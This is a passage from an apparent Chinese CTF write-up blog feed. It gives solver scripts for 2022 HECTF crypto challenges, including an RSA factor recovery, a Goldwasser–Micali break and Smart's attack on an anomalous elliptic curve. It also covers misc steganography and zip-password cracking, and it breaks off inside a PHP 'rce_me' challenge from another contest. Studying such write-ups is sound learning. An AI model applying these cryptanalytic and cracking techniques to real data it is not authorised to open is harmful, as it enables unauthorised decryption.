class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>素因子的生成函数中，</p><p>$q=\text{nextprime}(\Gamma(g+1) \bmod p)=\text{nextprime}(g! \bmod p)=\text{nextprime}((p-r)! \bmod p)$</p><p>结合威尔逊定理 $(p-2)! \equiv 1 \pmod p$，有</p><p>$q = \text{nextprime}(\prod\limits_{k=2}^{r-1}(p-k)^{-1} \bmod p)$</p><p>求出 $p,q$ ，RSA解密得hint：$e_1=2$，再解密得 $m$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line">p =<span class="number">8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672846909</span></span><br><span class="line">g =<span class="number">8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672815766</span></span><br><span class="line">c1 =<span class="number">6235217214618484469008717065109058585860810027126999050539741461978786126300064219884646722757808536523766850480291000964963856026236813451563022630637528</span></span><br><span class="line">c2 =<span class="number">11968687437667021636457941077557698735979559596315355015261643918655719362366246657937192921814834456270616376603153881488026042955084056042773344426448580968726245676672896245296438903588066436834165402064132845092674100931069500643230951702318353312541552786636249326131049369846465301549915712690800690627</span></span><br><span class="line">r = p-g</span><br><span class="line">q = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,r):</span><br><span class="line">    q = q*inverse_mod(p-k,p)%p</span><br><span class="line">q = sympy.nextprime(q)</span><br><span class="line">n = p*q</span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d2 = inverse_mod(e2,f)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2,d2,n)</span><br><span class="line">hint = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m2)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(hint)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;Here, e1=2, think about whether you can still use rsa to solve problems&#x27;</span></span><br><span class="line"></span><br><span class="line">e1 = <span class="number">2</span></span><br><span class="line">P.&lt;x&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">f = x ^ e1 - c1</span><br><span class="line">x = f.monic().roots()[<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">flag= <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(x)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;HECTF&#123;Happy_120th_birthday_to_Hebei_Normal_University&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="onebit"><a href="#onebit" class="headerlink" title="onebit"></a>onebit</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Le</span>(<span class="params">n, p</span>):</span><br><span class="line"> <span class="keyword">return</span> <span class="built_in">pow</span>(n, (p - <span class="number">1</span>) // <span class="number">2</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Encrypt</span>(<span class="params">message, n, g</span>):</span><br><span class="line"> ciphertext = []</span><br><span class="line"> <span class="keyword">for</span> i, m <span class="keyword">in</span> <span class="built_in">enumerate</span>(message):</span><br><span class="line">     k = random.randint(<span class="number">1</span>, <span class="number">2</span>**<span class="number">512</span>)</span><br><span class="line">     c = ((g**<span class="built_in">int</span>(m)) * (k ** <span class="number">2</span>)) % n</span><br><span class="line">     ciphertext.append(c)</span><br><span class="line"> <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"> g = getPrime(<span class="number">512</span>)</span><br><span class="line"> <span class="keyword">if</span> Le(g, p) == p-<span class="number">1</span> <span class="keyword">and</span> Le(g, q) == q-<span class="number">1</span>:</span><br><span class="line">     <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">m = <span class="built_in">str</span>(<span class="built_in">bin</span>(m))[<span class="number">2</span>:]</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">c = Encrypt(m, n, g)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(p)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(g)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(c))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure></blockquote><p>加密结果 $c=g^mk^2$，符合GM同态加密系统，分别判断 $c_i$ 是否为基于模 $p$ 的二次剩余即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">10314655380768703978472206709958842273413011533146844672390572314617934317138270085463277616223314361910177207125628813385040318943783776184128231730068517</span></span><br><span class="line">g = <span class="number">8263101522955373984025637723346797526375555424855735493538626380254785750558737652925053637878963928060840011944043285344527052241847201267694354571887089</span></span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line">plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> c:</span><br><span class="line">    cipher = <span class="built_in">int</span>(k)</span><br><span class="line">    <span class="keyword">if</span> gmpy2.jacobi(cipher,p) == -<span class="number">1</span>:</span><br><span class="line">        plaintext += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        plaintext += <span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(plaintext,<span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;HECTF&#123;359dbb32-04d5d9c6-7d463ebc-741c7454&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="mixture"><a href="#mixture" class="headerlink" title="mixture"></a>mixture</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">p=<span class="number">235322474717419</span></span><br><span class="line">a=<span class="number">0</span></span><br><span class="line">b=<span class="number">8856682</span></span><br><span class="line">k=</span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">P = E.random_point()</span><br><span class="line">P.order()==p</span><br><span class="line">Q=k*P</span><br><span class="line">aes_key=k</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;P:&quot;</span>,P)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Q:&quot;</span>,Q)</span><br><span class="line"><span class="comment">#P=E(180571547161769,227820272156445)</span></span><br><span class="line"><span class="comment">#Q=E(76765539897460,69715189045993)</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">aes_key = <span class="string">b&#x27;???&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">text</span>):</span><br><span class="line"> <span class="keyword">while</span> <span class="built_in">len</span>(text) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">     text += <span class="string">b&#x27; &#x27;</span></span><br><span class="line"> <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad_key</span>(<span class="params">key</span>):</span><br><span class="line"> <span class="keyword">while</span> <span class="built_in">len</span>(key) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">     key += <span class="string">b&#x27; &#x27;</span></span><br><span class="line"> <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line">aes = AES.new(pad_key(aes_key), AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">plain_text = <span class="string">b&#x27;???&#x27;</span></span><br><span class="line"></span><br><span class="line">enc_text = aes.encrypt(pad(plain_text))</span><br><span class="line">enc_text_b64=base64.b64encode(enc_text)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(enc_text_b64)</span><br><span class="line"><span class="comment">#bXaw/g8fD7taMjlL/OyqUJluD6dZI5GkZb9RrE5GQk8=</span></span><br></pre></td></tr></table></figure></blockquote><p>ECC+AES。</p><p>ECC满足 $P.\text{order}()=p$，利用Smart’s Attack解 $k$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">235322474717419</span></span><br><span class="line">a = <span class="number">0</span></span><br><span class="line">b = <span class="number">8856682</span></span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">P = E(<span class="number">180571547161769</span>,<span class="number">227820272156445</span>)</span><br><span class="line">Q = E(<span class="number">76765539897460</span>,<span class="number">69715189045993</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SmartAttack</span>(<span class="params">P,Q,p</span>):</span><br><span class="line">    E = P.curve()</span><br><span class="line">    Eqp = EllipticCurve(Qp(p, <span class="number">2</span>), [ ZZ(t) + randint(<span class="number">0</span>,p)*p <span class="keyword">for</span> t <span class="keyword">in</span> E.a_invariants() ])</span><br><span class="line"></span><br><span class="line">    P_Qps = Eqp.lift_x(ZZ(P.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> P_Qp <span class="keyword">in</span> P_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(P_Qp.xy()[<span class="number">1</span>]) == P.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> Q_Qp <span class="keyword">in</span> Q_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(Q_Qp.xy()[<span class="number">1</span>]) == Q.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    p_times_P = p*P_Qp</span><br><span class="line">    p_times_Q = p*Q_Qp</span><br><span class="line"></span><br><span class="line">    x_P,y_P = p_times_P.xy()</span><br><span class="line">    x_Q,y_Q = p_times_Q.xy()</span><br><span class="line"></span><br><span class="line">    phi_P = -(x_P/y_P)</span><br><span class="line">    phi_Q = -(x_Q/y_Q)</span><br><span class="line">    k = phi_Q/phi_P</span><br><span class="line">    <span class="keyword">return</span> ZZ(k)</span><br><span class="line"></span><br><span class="line">k = SmartAttack(P, Q, p)</span><br><span class="line"><span class="built_in">print</span>(k)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 152675955744921</span></span><br></pre></td></tr></table></figure><p>再代入还原AES解密即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">aes_key = <span class="string">b&#x27;152675955744921&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad_key</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(key) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">        key += <span class="string">b&#x27; &#x27;</span></span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line">aes = AES.new(pad_key(aes_key), AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">enc_text_b64 = <span class="string">&#x27;bXaw/g8fD7taMjlL/OyqUJluD6dZI5GkZb9RrE5GQk8=&#x27;</span></span><br><span class="line">enc_text = base64.b64decode(enc_text_b64)</span><br><span class="line">plain_text = aes.decrypt(enc_text)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(plain_text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;HECTF&#123;N0w_you_know_ecc_and_AES!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="xyz"><a href="#xyz" class="headerlink" title="xyz"></a>xyz</h3><p>由于素数 $x \in (2^{11},2^{12})$，爆破 $x$ ，再解关于 $y,z$ 的二元一次模方程组，根据式2将 $z$ 代入式1，得到关于 $y$ 的模方程，爆破求解 $m_1,m_2$，直到得到满足flag格式的值即解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">90269941327372741986138990624471228922188543388582792147052657918058877926048530226733915401487146960603412188605706389044850057749941283247036686933647699313789471852317821572828450212687824860596198164570332523289084374240518841959770316611451490236432102245045517406282462838053843074444594398723921432791</span></span><br><span class="line">a = <span class="number">76528144673843458522824450076110371539627923753787397683655100259800630176098551106179842548579216667636910919853615859002981078385969868960955053568271518271225085057932965836858836455161323221071080085783042898199649213810735170960799816250402517689895712143360516054216300443029075429435539217594182165579</span></span><br><span class="line">b = <span class="number">29135602763193779141406655503080226411846533327113770010672935904333289317045484412179311504151348405577659318044617676010167479271362994129802985294731037903701693595616818788260673254684442485084195062784616665615921849434909060917998818395292558822723253741815121539892159313890553027457549798418207587319</span></span><br><span class="line"></span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line"><span class="keyword">if</span> i.bit_length()==<span class="number">12</span> <span class="keyword">and</span> gmpy2.is_prime(i):</span><br><span class="line">s.append(i)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(s))</span><br><span class="line"></span><br><span class="line">ey = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> s:</span><br><span class="line">    <span class="built_in">print</span>(x)</span><br><span class="line">    P.&lt;y&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">    z = (b - x^<span class="number">12</span> - y^<span class="number">12</span>)*inverse_mod(<span class="number">120</span>*x,p)</span><br><span class="line">    g = (<span class="number">12</span> * x + <span class="number">12</span> * y + y * z + x * z ** <span class="number">12</span>) - a</span><br><span class="line">    roots = g.monic().roots()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(roots)&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> roots:</span><br><span class="line">            ee = x</span><br><span class="line">            yy = k[<span class="number">0</span>]</span><br><span class="line">            zz = (b - x^<span class="number">12</span> - yy^<span class="number">12</span>)*inverse_mod(<span class="number">120</span>*x,p)%p</span><br><span class="line">            d = inverse_mod(ee, p-<span class="number">1</span>)</span><br><span class="line">            m1 = <span class="built_in">pow</span>(yy, d, p)</span><br><span class="line">            m2 = <span class="built_in">pow</span>(zz, d, p)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;48454354467b&#x27;</span> <span class="keyword">in</span> <span class="built_in">hex</span>(m1)[<span class="number">2</span>:]:</span><br><span class="line">                <span class="built_in">print</span>(x)</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m1)[<span class="number">2</span>:]+<span class="built_in">hex</span>(m2)[<span class="number">2</span>:]))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line"><span class="comment"># 3989</span></span><br><span class="line"><span class="comment"># HECTF&#123;46de31725b9a50b20e27cab2ddd5f5845cdd19066b4f97612&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="咦-小鲨鱼来喽"><a href="#咦-小鲨鱼来喽" class="headerlink" title="咦~小鲨鱼来喽"></a>咦~小鲨鱼来喽</h3><p>wireshark打开流量文件，逐个流查看，一眼找到flag。</p><p>​    </p><h3 id="来玩捉迷藏呀"><a href="#来玩捉迷藏呀" class="headerlink" title="来玩捉迷藏呀"></a>来玩捉迷藏呀</h3><blockquote><p>你能寻找到真正的我吗？</p></blockquote><p>png图片有lsb隐写，zsteg提取出内容： <code>zsteg -E &quot;b1,rgb,lsb,xy&quot; 1010.png &gt; out1.txt</code>，</p><p>得到16进制字符串转string，再xor 0x33发现zip压缩包头，提取出zip压缩包，解压得到flag.doc，将文字全选设置颜色，发现flag：<code>HECTF&#123;hah0ha_Find-Me!!!&#125;</code>。</p><p>​    </p><h3 id="你把我flag藏哪去了"><a href="#你把我flag藏哪去了" class="headerlink" title="你把我flag藏哪去了?"></a>你把我flag藏哪去了?</h3><p>flag.docx中打开隐藏文字，得到的base64解码得第一段字符串：</p><p><code>kgkhlfloanaiufpghhalwujklkmownplkmwlygalpmfkgyggihuldlgaoyuloiggrplkvkgmrkaqzxemmiwklhugekleolpaaolffmaghmfgfmgvgjnblpmlajapufjlgplaojpjbffbjbwhuglggyjngmlbfygljbgxkixlmmqiksmpaqyojerafekadxdxxbarxlgngymsimhvuwkaexsglrapggkabmfulgvnmajufoekymalimxdijjpxyiagbpmkuallnlkpoeagfldlposkizvyxraazxrgxanoihqlxfogfgglpgjylkeakbylfvjomllkgjgymgfdlrpeqfklfslmejilpjiklpaapglxyevfkylfappbkdzflffllikqnialkbhjorndhsfomfaypghpqoxryimhfllfhlmkoreamroakgrljahmfailijanykfuaihfbzafaufmsffngfalmrbfflfaffwlnjmfgaaffauazjfijxiabfirmovpzekirbasfjsgzlukolyvohmvaalpkahsxfzammbfnmldzyaauifldvkmzbgfybaoffrflfoaadgmllnbgfpnrgxllyphyfnlexbvdnlokgoyilprflonshalkjaxngbjhlmbpdlamhkjfnlgmaagfjnjgkfrizlfflpmmglapxgmuninaaupkpfdigpsasmvkdjvgiyofdumpngpaljkjblfhahskiokpfgaayhnnfdsxkffqjaazvvdosefppfofigyamfnfngvlaoapdyixvbfdosobmlubaiugjxhfyfkvrakazgluyilpvgfwgynqggplbkwiiaxarlaflaalfkxfjlpegmmajngujlofuiffmvikfimraogqalalfmgubagfggoaakgrfqfhaemosraafyfopukudaalfggimhdfognhkrleflpalgalfapyjalgvoklgfllgaflaafafmazygpehfkzhlazngfmofliazlvnxanalugjlafovljfjubzgapehhfkfnfnggpalylivfegaaidrmyjagfalgmagflrklugadpffuaaky</code></p><p>otherflag.txt中含有零宽字符，利用在线网站提取出第二段字符串：</p><p><code>flpfypbgfeapwpsnlwklawllgryafjslgnbwapdfpzbpauanalfopwfpiabloaallziffklfggufrajpifgjfpakfmxpbsulvjsgmflgalagfnarslkbakuyfggagkfglnalduvqeayjgajmngeglnggxlngfmjmigkkiumlnfdwlkmaugngnvrrbfzxzyauauehofnemfmfffabbgvldlyhoaqjomfplapvhaaakogfirfvamkffygakampauuooolgpnnuelhffhvvisukwynmiglnllumhajekuguuplrxkiaeffllfkayrffggfffgyvpufvpbgagfaekipailovaffanuxsjgvjdqkvfuikflafmdkbbnkpgfxrqpfglavgslujjlffulhugzliumaadngwihmmojfbhxvomafpbfhaviwlguefogppmjsplglfhlgrklbisphajpgnhlispnaskklljggklzaffhnelnfyrymgaghfifojmjjsekoomffffuaawbdgaqrmgzprvgwzjxefhjadkikurllllljoghmlwfflfmlovfplnaqpeozloadkeiolfklivuylzbjooxlsglngduvxanahjgepgu&#125;klghplmvzilkpggpholgiogjavpagjhdonunlpgolndqbqfdmbpjjoxbomlikyuipnxqxzlifforghheuyyazhjuagfwaulrjlfxoiggyjfbfpjigkgyafplfpqwadiqniavvgufjdjlifjiorymvfxmxgorilyldfhofbbygflgairjdidgdqvikjoliyfdzhfrognyyibkgnnvhmjlolfgvwfijlggfkpakpgflfydvfwydofkhgiygwllwljogrqvzjlffgllallblpkfbsflhrajdgowprdblubflyoybhvhwfwoeiagnxbzniffpllxmfknuihfobfeefkkgkynnglkkldugmgsvnphlafgsrnroehvffwapnfjfpglrkpafhlsjgriplrfldglznhonfdlohosfhohegknaiamjflnboplllxluigoxlkrbglrgebaggriaefmzlqidofgafqgbgdilnmhoaionobfynlgozadgvvimxoboaikkfxwirorpflluzhophfdliekljyomejklgffjnunh&#123;opgdafgamla</code></p><p>看字符串无规律，猜测为字符频率统计，找一个<a href="https://uutool.cn/str-statistics/">在线工具</a>统计字符出现次数，按结果从大到小排序取出对应字符为 <code>flagkpomijnhuybrvdxezswq&#123;&#125;</code>，调整括号位置即为flag：<code>flag&#123;kpomijnhuybrvdxezswq&#125;</code>。</p><p>​    </p><h3 id="我的手要不行辣"><a href="#我的手要不行辣" class="headerlink" title="我的手要不行辣"></a>我的手要不行辣</h3><p>图片内文字用在线OCR识别转文字，hex转字符，根据文件头转存为zip压缩包，使用ARCHPR爆破出密码8686，解压得到txt内为音符加密，使用<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">在线解密工具</a>解密得到flag：<code>flag&#123;y0u_fi0d_m2_f1ag&#125;</code>。</p><p>​    </p><h3 id="2022HECTF调查问卷"><a href="#2022HECTF调查问卷" class="headerlink" title="2022HECTF调查问卷"></a>2022HECTF调查问卷</h3><p>写问卷得flag。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;2022HECTF是由河北师范大学SourceCode战队组织的面向全国大学生的CTF竞技活动，河北师范大学计算机与网络空间安全学院主办，河北省网络与信息安全重点实验室和河北师范大学信息安全协会承办，是面向全国大学生的一次竞技活动。&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022赛" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2022年羊城杯网络安全大赛</title>
    <link href="https://lazzzaro.github.io/2022/09/04/match-2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2022/09/04/match-2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</id>
    <published>2022-09-04T05:46:20.000Z</published>
    <updated>2022-09-04T13:50:35.327Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>大赛由中共广州市委网络安全和信息化委员会办公室作为指导单位，广州市网络安全产业促进会主办，广东外语外贸大学、杭州安恒信息技术股份有限公司承办，广州市信息安全测评中心、广州互联网协会协办。</p><p>大赛以“网络安全为人民、网络安全靠人民”为主题，旨在通过竞赛的方式提高参赛选手攻防兼备的网络安全实践技能，实现以赛促学、以赛会友，加强不同院校及单位间的技术交流。</p><p>本届大赛由【广外女生战队】与杭州安恒信息技术股份有限公司共同命题，采用CTF（夺旗赛）团队竞赛模式，参赛队伍通过互联网在线解题，题目类型涉及Web安全、逆向工程 (Reverse)、二进制漏洞挖掘和利用（Pwn）、密码学（Crypto）、杂项（Misc）等类别。</p><p>比赛时间：9月3日 9:00 - 9月4日 9:00</p><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="rce-me"><a href="#rce-me" class="headerlink" title="rce_me"></a>rce_me</h3><blockquote><p>简单web</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>])) ? <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>) : <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fliter</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">     <span class="variable">$blacklist</span> = [<span 